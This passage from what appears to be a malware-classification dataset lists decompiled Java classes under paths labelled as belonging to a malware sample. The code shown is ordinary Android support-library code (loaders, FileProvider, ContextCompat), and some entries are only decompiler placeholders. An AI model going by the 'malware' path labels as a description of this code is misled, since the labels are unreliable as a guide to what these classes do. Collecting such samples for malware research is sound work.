onCanceled(data);       return;     }     commitContentChanged();     this.mLastLoadCompleteTime=SystemClock.uptimeMillis();     this.mTask=null;     deliverResult(data);   }   protected D onLoadInBackground(){     return loadInBackground();   }   public void waitForLoader(){     AsyncTaskLoader<D>.LoadTask task=this.mTask;     if (task != null) {       try {         ((LoadTask)task).done.await();       }  catch (      InterruptedException e) {       }     }   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     if (this.mTask != null) {       writer.print(prefix);       writer.print(""mTask="");       writer.print(this.mTask);       writer.print("" waiting="");       writer.println(this.mTask.waiting);     }     if (this.mCancellingTask != null) {       writer.print(prefix);       writer.print(""mCancellingTask="");       writer.print(this.mCancellingTask);       writer.print("" waiting="");       writer.println(this.mCancellingTask.waiting);     }     if (this.mUpdateThrottle != 0) {       writer.print(prefix);       writer.print(""mUpdateThrottle="");       TimeUtils.formatDuration(this.mUpdateThrottle,writer);       writer.print("" mLastLoadCompleteTime="");       TimeUtils.formatDuration(this.mLastLoadCompleteTime,SystemClock.uptimeMillis(),writer);       writer.println();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\AsyncTaskResult.code","public static class AsyncTaskResult<Data> {   final Data[] mData;   final ModernAsyncTask mTask;   AsyncTaskResult(  ModernAsyncTask task,  Data... data){     this.mTask=task;     this.mData=data;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\BroadcastRecord.code","public static class BroadcastRecord {   final Intent intent;   final ArrayList<ReceiverRecord> receivers;   BroadcastRecord(  Intent _intent,  ArrayList<ReceiverRecord> _receivers){     this.intent=_intent;     this.receivers=_receivers;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ContextCompat.code","public class ContextCompat {   private static final String DIR_ANDROID=""Android"";   private static final String DIR_CACHE=""cache"";   private static final String DIR_DATA=""data"";   private static final String DIR_FILES=""files"";   private static final String DIR_OBB=""obb"";   public static boolean startActivities(  Context context,  Intent[] intents){     return startActivities(context,intents,null);   }   public static boolean startActivities(  Context context,  Intent[] intents,  Bundle options){     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       ContextCompatJellybean.startActivities(context,intents,options);       return true;     }     if (version >= 11) {       ContextCompatHoneycomb.startActivities(context,intents);       return true;     }     return false;   }   public static File[] getObbDirs(  Context context){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getObbDirs(context);     }     if (version >= 11) {       single=ContextCompatHoneycomb.getObbDir(context);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_OBB,context.getPackageName());     }     return new File[]{single};   }   public static File[] getExternalFilesDirs(  Context context,  String type){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getExternalFilesDirs(context,type);     }     if (version >= 8) {       single=ContextCompatFroyo.getExternalFilesDir(context,type);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_DATA,context.getPackageName(),DIR_FILES,type);     }     return new File[]{single};   }   public static File[] getExternalCacheDirs(  Context context){     File single;     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return ContextCompatKitKat.getExternalCacheDirs(context);     }     if (version >= 8) {       single=ContextCompatFroyo.getExternalCacheDir(context);     }  else {       single=buildPath(Environment.getExternalStorageDirectory(),DIR_ANDROID,DIR_DATA,context.getPackageName(),DIR_CACHE);     }     return new File[]{single};   }   private static File buildPath(  File base,  String... segments){     File cur;     int len$=segments.length;     int i$=0;     File cur2=base;     while (i$ < len$) {       String segment=segments[i$];       if (cur2 == null) {         cur=new File(segment);       }  else {         cur=segment != null ? new File(cur2,segment) : cur2;       }       i$++;       cur2=cur;     }     return cur2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ContextCompatFroyo.code","class ContextCompatFroyo {   ContextCompatFroyo(){   }   public static File getExternalCacheDir(  Context context){     return context.getExternalCacheDir();   }   public static File getExternalFilesDir(  Context context,  String type){     return context.getExternalFilesDir(type);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ContextCompatHoneycomb.code","class ContextCompatHoneycomb {   ContextCompatHoneycomb(){   }   public static void startActivities(  Context context,  Intent[] intents){     context.startActivities(intents);   }   public static File getObbDir(  Context context){     return context.getObbDir();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ContextCompatJellybean.code","class ContextCompatJellybean {   ContextCompatJellybean(){   }   public static void startActivities(  Context context,  Intent[] intents,  Bundle options){     context.startActivities(intents,options);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ContextCompatKitKat.code","class ContextCompatKitKat {   ContextCompatKitKat(){   }   public static File[] getExternalCacheDirs(  Context context){     return context.getExternalCacheDirs();   }   public static File[] getExternalFilesDirs(  Context context,  String type){     return context.getExternalFilesDirs(type);   }   public static File[] getObbDirs(  Context context){     return context.getObbDirs();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\CursorLoader.code","public class CursorLoader extends AsyncTaskLoader<Cursor> {   Cursor mCursor;   final Loader<Cursor>.ForceLoadContentObserver mObserver;   String[] mProjection;   String mSelection;   String[] mSelectionArgs;   String mSortOrder;   Uri mUri;   @Override public Cursor loadInBackground(){     Cursor cursor=getContext().getContentResolver().query(this.mUri,this.mProjection,this.mSelection,this.mSelectionArgs,this.mSortOrder);     if (cursor != null) {       cursor.getCount();       cursor.registerContentObserver(this.mObserver);     }     return cursor;   }   @Override public void deliverResult(  Cursor cursor){     if (isReset()) {       if (cursor != null) {         cursor.close();         return;       }       return;     }     Cursor oldCursor=this.mCursor;     this.mCursor=cursor;     if (isStarted()) {       super.deliverResult((CursorLoader)cursor);     }     if (oldCursor != null && oldCursor != cursor && !oldCursor.isClosed()) {       oldCursor.close();     }   }   public CursorLoader(  Context context){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();   }   public CursorLoader(  Context context,  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     super(context);     this.mObserver=new Loader.ForceLoadContentObserver();     this.mUri=uri;     this.mProjection=projection;     this.mSelection=selection;     this.mSelectionArgs=selectionArgs;     this.mSortOrder=sortOrder;   }   @Override protected void onStartLoading(){     if (this.mCursor != null) {       deliverResult(this.mCursor);     }     if (takeContentChanged() || this.mCursor == null) {       forceLoad();     }   }   @Override protected void onStopLoading(){     cancelLoad();   }   @Override public void onCanceled(  Cursor cursor){     if (cursor != null && !cursor.isClosed()) {       cursor.close();     }   }   @Override public void onReset(){     super.onReset();     onStopLoading();     if (this.mCursor != null && !this.mCursor.isClosed()) {       this.mCursor.close();     }     this.mCursor=null;   }   public Uri getUri(){     return this.mUri;   }   public void setUri(  Uri uri){     this.mUri=uri;   }   public String[] getProjection(){     return this.mProjection;   }   public void setProjection(  String[] projection){     this.mProjection=projection;   }   public String getSelection(){     return this.mSelection;   }   public void setSelection(  String selection){     this.mSelection=selection;   }   public String[] getSelectionArgs(){     return this.mSelectionArgs;   }   public void setSelectionArgs(  String[] selectionArgs){     this.mSelectionArgs=selectionArgs;   }   public String getSortOrder(){     return this.mSortOrder;   }   public void setSortOrder(  String sortOrder){     this.mSortOrder=sortOrder;   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     super.dump(prefix,fd,writer,args);     writer.print(prefix);     writer.print(""mUri="");     writer.println(this.mUri);     writer.print(prefix);     writer.print(""mProjection="");     writer.println(Arrays.toString(this.mProjection));     writer.print(prefix);     writer.print(""mSelection="");     writer.println(this.mSelection);     writer.print(prefix);     writer.print(""mSelectionArgs="");     writer.println(Arrays.toString(this.mSelectionArgs));     writer.print(prefix);     writer.print(""mSortOrder="");     writer.println(this.mSortOrder);     writer.print(prefix);     writer.print(""mCursor="");     writer.println(this.mCursor);     writer.print(prefix);     writer.print(""mContentChanged="");     writer.println(this.mContentChanged);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\FileProvider.code","public class FileProvider extends ContentProvider {   private static final String ATTR_NAME=""name"";   private static final String ATTR_PATH=""path"";   private static final String META_DATA_FILE_PROVIDER_PATHS=""android.support.FILE_PROVIDER_PATHS"";   private static final String TAG_CACHE_PATH=""cache-path"";   private static final String TAG_EXTERNAL=""external-path"";   private static final String TAG_FILES_PATH=""files-path"";   private static final String TAG_ROOT_PATH=""root-path"";   private PathStrategy mStrategy;   private static final String[] COLUMNS={""_display_name"",""_size""};   private static final File DEVICE_ROOT=new File(""/"");   private static HashMap<String,PathStrategy> sCache=new HashMap<>(); public interface PathStrategy {     File getFileForUri(    Uri uri);     Uri getUriForFile(    File file);   }   @Override public boolean onCreate(){     return true;   }   @Override public void attachInfo(  Context context,  ProviderInfo info){     super.attachInfo(context,info);     if (info.exported) {       throw new SecurityException(""Provider must not be exported"");     }     if (!info.grantUriPermissions) {       throw new SecurityException(""Provider must grant uri permissions"");     }     this.mStrategy=getPathStrategy(context,info.authority);   }   public static Uri getUriForFile(  Context context,  String authority,  File file){     PathStrategy strategy=getPathStrategy(context,authority);     return strategy.getUriForFile(file);   }   @Override public Cursor query(  Uri uri,  String[] projection,  String selection,  String[] selectionArgs,  String sortOrder){     int i;     File file=this.mStrategy.getFileForUri(uri);     if (projection == null) {       projection=COLUMNS;     }     String[] cols=new String[projection.length];     Object[] values=new Object[projection.length];     String[] arr$=projection;     int len$=arr$.length;     int i$=0;     int i2=0;     while (i$ < len$) {       String col=arr$[i$];       if (""_display_name"".equals(col)) {         cols[i2]=""_display_name"";         i=i2 + 1;         values[i2]=file.getName();       }  else       if (""_size"".equals(col)) {         cols[i2]=""_size"";         i=i2 + 1;         values[i2]=Long.valueOf(file.length());       }  else {         i=i2;       }       i$++;       i2=i;     }     String[] cols2=copyOf(cols,i2);     Object[] values2=copyOf(values,i2);     MatrixCursor cursor=new MatrixCursor(cols2,1);     cursor.addRow(values2);     return cursor;   }   @Override public String getType(  Uri uri){     File file=this.mStrategy.getFileForUri(uri);     int lastDot=file.getName().lastIndexOf(46);     if (lastDot >= 0) {       String extension=file.getName().substring(lastDot + 1);       String mime=MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);       if (mime != null) {         return mime;       }     }     return ""application/octet-stream"";   }   @Override public Uri insert(  Uri uri,  ContentValues values){     throw new UnsupportedOperationException(""No external inserts"");   }   @Override public int update(  Uri uri,  ContentValues values,  String selection,  String[] selectionArgs){     throw new UnsupportedOperationException(""No external updates"");   }   @Override public int delete(  Uri uri,  String selection,  String[] selectionArgs){     File file=this.mStrategy.getFileForUri(uri);     return file.delete() ? 1 : 0;   }   @Override public ParcelFileDescriptor openFile(  Uri uri,  String mode) throws FileNotFoundException {     File file=this.mStrategy.getFileForUri(uri);     int fileMode=modeToMode(mode);     return ParcelFileDescriptor.open(file,fileMode);   }   private static PathStrategy getPathStrategy(  Context context,  String authority){     PathStrategy strat; synchronized (sCache) {       strat=sCache.get(authority);       if (strat == null) {         try {           try {             strat=parsePathStrategy(context,authority);             sCache.put(authority,strat);           }  catch (          IOException e) {             throw new IllegalArgumentException(""Failed to parse android.support.FILE_PROVIDER_PATHS meta-data"",e);           }         }  catch (        XmlPullParserException e2) {           throw new IllegalArgumentException(""Failed to parse android.support.FILE_PROVIDER_PATHS meta-data"",e2);         }       }     }     return strat;   }   private static PathStrategy parsePathStrategy(  Context context,  String authority) throws IOException, XmlPullParserException {     SimplePathStrategy strat=new SimplePathStrategy(authority);     ProviderInfo info=context.getPackageManager().resolveContentProvider(authority,128);     XmlResourceParser in=info.loadXmlMetaData(context.getPackageManager(),META_DATA_FILE_PROVIDER_PATHS);     if (in == null) {       throw new IllegalArgumentException(""Missing android.support.FILE_PROVIDER_PATHS meta-data"");     }     while (true) {       int type=in.next();       if (type != 1) {         if (type == 2) {           String tag=in.getName();           String name=in.getAttributeValue(null,ATTR_NAME);           String path=in.getAttributeValue(null,ATTR_PATH);           File target=null;           if (TAG_ROOT_PATH.equals(tag)) {             target=buildPath(DEVICE_ROOT,path);           }  else           if (TAG_FILES_PATH.equals(tag)) {             target=buildPath(context.getFilesDir(),path);           }  else           if (TAG_CACHE_PATH.equals(tag)) {             target=buildPath(context.getCacheDir(),path);           }  else           if (TAG_EXTERNAL.equals(tag)) {             target=buildPath(Environment.getExternalStorageDirectory(),path);           }           if (target != null) {             strat.addRoot(name,target);           }         }       }  else {         return strat;       }     }   } public static class SimplePathStrategy implements PathStrategy {     private final String mAuthority;     private final HashMap<String,File> mRoots=new HashMap<>();     public SimplePathStrategy(    String authority){       this.mAuthority=authority;     }     public void addRoot(    String name,    File root){       if (TextUtils.isEmpty(name)) {         throw new IllegalArgumentException(""Name must not be empty"");       }       try {         this.mRoots.put(name,root.getCanonicalFile());       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + root,e);       }     }     @Override public Uri getUriForFile(    File file){       String path;       try {         String path2=file.getCanonicalPath();         Map.Entry<String,File> mostSpecific=null;         for (        Map.Entry<String,File> root : this.mRoots.entrySet()) {           String rootPath=root.getValue().getPath();           if (path2.startsWith(rootPath) && (mostSpecific == null || rootPath.length() > mostSpecific.getValue().getPath().length())) {             mostSpecific=root;           }         }         if (mostSpecific == null) {           throw new IllegalArgumentException(""Failed to find configured root that contains "" + path2);         }         String rootPath2=mostSpecific.getValue().getPath();         if (rootPath2.endsWith(""/"")) {           path=path2.substring(rootPath2.length());         }  else {           path=path2.substring(rootPath2.length() + 1);         }         return new Uri.Builder().scheme(""content"").authority(this.mAuthority).encodedPath(Uri.encode(mostSpecific.getKey()) + '/' + Uri.encode(path,""/"")).build();       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);       }     }     @Override public File getFileForUri(    Uri uri){       String path=uri.getEncodedPath();       int splitIndex=path.indexOf(47,1);       String tag=Uri.decode(path.substring(1,splitIndex));       String path2=Uri.decode(path.substring(splitIndex + 1));       File root=this.mRoots.get(tag);       if (root == null) {         throw new IllegalArgumentException(""Unable to find configured root for "" + uri);       }       File file=new File(root,path2);       try {         File file2=file.getCanonicalFile();         if (!file2.getPath().startsWith(root.getPath())) {           throw new SecurityException(""Resolved path jumped beyond configured root"");         }         return file2;       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);       }     }   }   private static int modeToMode(  String mode){     if (""r"".equals(mode)) {       return 268435456;     }     if (""w"".equals(mode) || ""wt"".equals(mode)) {       return 738197504;     }     if (""wa"".equals(mode)) {       return 704643072;     }     if (""rw"".equals(mode)) {       return 939524096;     }     if (""rwt"".equals(mode)) {       return 1006632960;     }     throw new IllegalArgumentException(""Invalid mode: "" + mode);   }   private static File buildPath(  File base,  String... segments){     int len$=segments.length;     int i$=0;     File cur=base;     while (i$ < len$) {       String segment=segments[i$];       i$++;       cur=segment != null ? new File(cur,segment) : cur;     }     return cur;   }   private static String[] copyOf(  String[] original,  int newLength){     String[] result=new String[newLength];     System.arraycopy(original,0,result,0,newLength);     return result;   }   private static Object[] copyOf(  Object[] original,  int newLength){     Object[] result=new Object[newLength];     System.arraycopy(original,0,result,0,newLength);     return result;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ForceLoadContentObserver.code","public final class ForceLoadContentObserver extends ContentObserver {   public ForceLoadContentObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     Loader.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompat.code","public class IntentCompat {   public static final String ACTION_EXTERNAL_APPLICATIONS_AVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"";   public static final String ACTION_EXTERNAL_APPLICATIONS_UNAVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE"";   public static final String EXTRA_CHANGED_PACKAGE_LIST=""android.intent.extra.changed_package_list"";   public static final String EXTRA_CHANGED_UID_LIST=""android.intent.extra.changed_uid_list"";   public static final String EXTRA_HTML_TEXT=""android.intent.extra.HTML_TEXT"";   public static final int FLAG_ACTIVITY_CLEAR_TASK=32768;   public static final int FLAG_ACTIVITY_TASK_ON_HOME=16384;   private static final IntentCompatImpl IMPL; interface IntentCompatImpl {     Intent makeMainActivity(    ComponentName componentName);     Intent makeMainSelectorActivity(    String str,    String str2);     Intent makeRestartActivityTask(    ComponentName componentName);   } static class IntentCompatImplBase implements IntentCompatImpl {     IntentCompatImplBase(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       Intent intent=new Intent(""android.intent.action.MAIN"");       intent.setComponent(componentName);       intent.addCategory(""android.intent.category.LAUNCHER"");       return intent;     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       Intent intent=new Intent(selectorAction);       intent.addCategory(selectorCategory);       return intent;     }     @Override public Intent makeRestartActivityTask(    ComponentName mainActivity){       Intent intent=makeMainActivity(mainActivity);       intent.addFlags(268468224);       return intent;     }   } static class IntentCompatImplHC extends IntentCompatImplBase {     IntentCompatImplHC(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       return IntentCompatHoneycomb.makeMainActivity(componentName);     }     @Override public Intent makeRestartActivityTask(    ComponentName componentName){       return IntentCompatHoneycomb.makeRestartActivityTask(componentName);     }   } static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {     IntentCompatImplIcsMr1(){     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 15) {       IMPL=new IntentCompatImplIcsMr1();     }  else     if (version >= 11) {       IMPL=new IntentCompatImplHC();     }  else {       IMPL=new IntentCompatImplBase();     }   }   private IntentCompat(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return IMPL.makeMainActivity(mainActivity);   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IMPL.makeMainSelectorActivity(selectorAction,selectorCategory);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return IMPL.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompatHoneycomb.code","class IntentCompatHoneycomb {   IntentCompatHoneycomb(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return Intent.makeMainActivity(mainActivity);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return Intent.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompatIcsMr1.code","class IntentCompatIcsMr1 {   IntentCompatIcsMr1(){   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return Intent.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompatImpl.code","interface IntentCompatImpl {   Intent makeMainActivity(  ComponentName componentName);   Intent makeMainSelectorActivity(  String str,  String str2);   Intent makeRestartActivityTask(  ComponentName componentName); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompatImplBase.code","static class IntentCompatImplBase implements IntentCompatImpl {   IntentCompatImplBase(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.setComponent(componentName);     intent.addCategory(""android.intent.category.LAUNCHER"");     return intent;   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     Intent intent=new Intent(selectorAction);     intent.addCategory(selectorCategory);     return intent;   }   @Override public Intent makeRestartActivityTask(  ComponentName mainActivity){     Intent intent=makeMainActivity(mainActivity);     intent.addFlags(268468224);     return intent;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompatImplHC.code","static class IntentCompatImplHC extends IntentCompatImplBase {   IntentCompatImplHC(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     return IntentCompatHoneycomb.makeMainActivity(componentName);   }   @Override public Intent makeRestartActivityTask(  ComponentName componentName){     return IntentCompatHoneycomb.makeRestartActivityTask(componentName);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\IntentCompatImplIcsMr1.code","static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {   IntentCompatImplIcsMr1(){   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\InternalHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@420c38f9"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\Loader.code","public class Loader<D> {   Context mContext;   int mId;   OnLoadCompleteListener<D> mListener;   boolean mStarted=false;   boolean mAbandoned=false;   boolean mReset=true;   boolean mContentChanged=false;   boolean mProcessingChange=false; public interface OnLoadCompleteListener<D> {     void onLoadComplete(    Loader<D> loader,    D d);   } public final class ForceLoadContentObserver extends ContentObserver {     public ForceLoadContentObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       Loader.this.onContentChanged();     }   }   public Loader(  Context context){     this.mContext=context.getApplicationContext();   }   public void deliverResult(  D data){     if (this.mListener != null) {       this.mListener.onLoadComplete(this,data);     }   }   public Context getContext(){     return this.mContext;   }   public int getId(){     return this.mId;   }   public void registerListener(  int id,  OnLoadCompleteListener<D> listener){     if (this.mListener != null) {       throw new IllegalStateException(""There is already a listener registered"");     }     this.mListener=listener;     this.mId=id;   }   public void unregisterListener(  OnLoadCompleteListener<D> listener){     if (this.mListener == null) {       throw new IllegalStateException(""No listener register"");     }     if (this.mListener != listener) {       throw new IllegalArgumentException(""Attempting to unregister the wrong listener"");     }     this.mListener=null;   }   public boolean isStarted(){     return this.mStarted;   }   public boolean isAbandoned(){     return this.mAbandoned;   }   public boolean isReset(){     return this.mReset;   }   public final void startLoading(){     this.mStarted=true;     this.mReset=false;     this.mAbandoned=false;     onStartLoading();   }   protected void onStartLoading(){   }   public void forceLoad(){     onForceLoad();   }   public void onForceLoad(){   }   public void stopLoading(){     this.mStarted=false;     onStopLoading();   }   protected void onStopLoading(){   }   public void abandon(){     this.mAbandoned=true;     onAbandon();   }   protected void onAbandon(){   }   public void reset(){     onReset();     this.mReset=true;     this.mStarted=false;     this.mAbandoned=false;     this.mContentChanged=false;     this.mProcessingChange=false;   }   public void onReset(){   }   public boolean takeContentChanged(){     boolean res=this.mContentChanged;     this.mContentChanged=false;     this.mProcessingChange|=res;     return res;   }   public void commitContentChanged(){     this.mProcessingChange=false;   }   public void rollbackContentChanged(){     if (this.mProcessingChange) {       this.mContentChanged=true;     }   }   public void onContentChanged(){     if (this.mStarted) {       forceLoad();     }  else {       this.mContentChanged=true;     }   }   public String dataToString(  D data){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(data,sb);     sb.append(""}"");     return sb.toString();   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(this,sb);     sb.append("" id="");     sb.append(this.mId);     sb.append(""}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mListener="");     writer.println(this.mListener);     if (this.mStarted || this.mContentChanged || this.mProcessingChange) {       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mContentChanged="");       writer.print(this.mContentChanged);       writer.print("" mProcessingChange="");       writer.println(this.mProcessingChange);     }     if (this.mAbandoned || this.mReset) {       writer.print(prefix);       writer.print(""mAbandoned="");       writer.print(this.mAbandoned);       writer.print("" mReset="");       writer.println(this.mReset);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\LoadTask.code","public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {   private CountDownLatch done=new CountDownLatch(1);   D result;   boolean waiting;   LoadTask(){   }   @Override public D doInBackground(  Void... voidArr){     this.result=(D)AsyncTaskLoader.this.onLoadInBackground();     return this.result;   }   @Override protected void onPostExecute(  D data){     try {       AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);     }   finally {       this.done.countDown();     }   }   @Override protected void onCancelled(){     try {       AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);     }   finally {       this.done.countDown();     }   }   @Override public void run(){     this.waiting=false;     AsyncTaskLoader.this.executePendingTask();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\LocalBroadcastManager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@8f3c594"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ModernAsyncTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7a30257c"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\OnLoadCompleteListener.code","public interface OnLoadCompleteListener<D> {   void onLoadComplete(  Loader<D> loader,  D d); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\PathStrategy.code","public interface PathStrategy {   File getFileForUri(  Uri uri);   Uri getUriForFile(  File file); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\ReceiverRecord.code","public static class ReceiverRecord {   boolean broadcasting;   final IntentFilter filter;   final BroadcastReceiver receiver;   ReceiverRecord(  IntentFilter _filter,  BroadcastReceiver _receiver){     this.filter=_filter;     this.receiver=_receiver;   }   public String toString(){     StringBuilder builder=new StringBuilder(128);     builder.append(""Receiver{"");     builder.append(this.receiver);     builder.append("" filter="");     builder.append(this.filter);     builder.append(""}"");     return builder.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\SimplePathStrategy.code","public static class SimplePathStrategy implements PathStrategy {   private final String mAuthority;   private final HashMap<String,File> mRoots=new HashMap<>();   public SimplePathStrategy(  String authority){     this.mAuthority=authority;   }   public void addRoot(  String name,  File root){     if (TextUtils.isEmpty(name)) {       throw new IllegalArgumentException(""Name must not be empty"");     }     try {       this.mRoots.put(name,root.getCanonicalFile());     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + root,e);     }   }   @Override public Uri getUriForFile(  File file){     String path;     try {       String path2=file.getCanonicalPath();       Map.Entry<String,File> mostSpecific=null;       for (      Map.Entry<String,File> root : this.mRoots.entrySet()) {         String rootPath=root.getValue().getPath();         if (path2.startsWith(rootPath) && (mostSpecific == null || rootPath.length() > mostSpecific.getValue().getPath().length())) {           mostSpecific=root;         }       }       if (mostSpecific == null) {         throw new IllegalArgumentException(""Failed to find configured root that contains "" + path2);       }       String rootPath2=mostSpecific.getValue().getPath();       if (rootPath2.endsWith(""/"")) {         path=path2.substring(rootPath2.length());       }  else {         path=path2.substring(rootPath2.length() + 1);       }       return new Uri.Builder().scheme(""content"").authority(this.mAuthority).encodedPath(Uri.encode(mostSpecific.getKey()) + '/' + Uri.encode(path,""/"")).build();     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);     }   }   @Override public File getFileForUri(  Uri uri){     String path=uri.getEncodedPath();     int splitIndex=path.indexOf(47,1);     String tag=Uri.decode(path.substring(1,splitIndex));     String path2=Uri.decode(path.substring(splitIndex + 1));     File root=this.mRoots.get(tag);     if (root == null) {       throw new IllegalArgumentException(""Unable to find configured root for "" + uri);     }     File file=new File(root,path2);     try {       File file2=file.getCanonicalFile();       if (!file2.getPath().startsWith(root.getPath())) {         throw new SecurityException(""Resolved path jumped beyond configured root"");       }       return file2;     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);     }   } 